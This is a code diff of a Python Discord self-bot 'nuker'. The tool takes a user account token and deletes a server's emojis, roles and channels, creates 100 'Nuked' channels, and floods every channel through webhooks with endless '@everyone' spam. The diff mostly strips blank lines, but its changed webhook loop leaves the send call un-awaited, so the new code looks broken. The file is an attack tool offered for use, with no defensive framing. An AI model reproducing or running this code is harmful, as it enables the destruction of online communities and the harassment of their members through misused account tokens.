@@ -5,19 +5,11 @@ from discord.ext import commands
 from discord import AsyncWebhookAdapter
 import aiohttp
 
-
-
-
-
-
 intents = discord.Intents(messages=True, guilds=True, members=True)
 
 tucan = input("token (user) > ")
 
 o = commands.Bot(command_prefix="!", case_insensitive=True, self_bot=True, intents=intents)
-
-
-
 
 
 @o.event
@@ -36,10 +28,6 @@ async def on_ready():
    !flood - flood all chats
   """)
 
-
-
-
-
 @o.command()
 async def emojinuke(ctx):
     try:
@@ -49,12 +37,6 @@ async def emojinuke(ctx):
     except:
         print("[-] Couldn't delete the emoji.")
         pass
-
-
-
-
-
-
 
 @o.command()
 async def nuke(ctx):
@@ -72,30 +54,14 @@ async def ccflood(ctx):
     for i in range(100):
         await ctx.guild.create_text_channel(name="Nuked")  
 
-
-
-
-
-
-
-
 @o.event
 async def on_guild_channel_create(channel):
     try:
-      webhook = await channel.create_webhook(name="Selfbot-By-Eitor")
-      async with aiohttp.ClientSession() as session:
-        webhook = webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
-        while True:
-          await webhook.send("@everyone higuys")
-          print("[-] Webhook sent.")
+      webhook = await channel.create_webhook(name="nuked")
+      while True:
+        webhook.send("everyone")
     except:
-        print("[-] Couldn't send the webhook.")
-    pass
-
-
-
-
-
+        pass
 
 
 @o.command()
@@ -129,10 +95,4 @@ async def rolenuke(ctx):
         print("[-] Couldn't delete role.")
         pass
 
-
-
-
-
-
 o.run(tucan, bot=False)
-
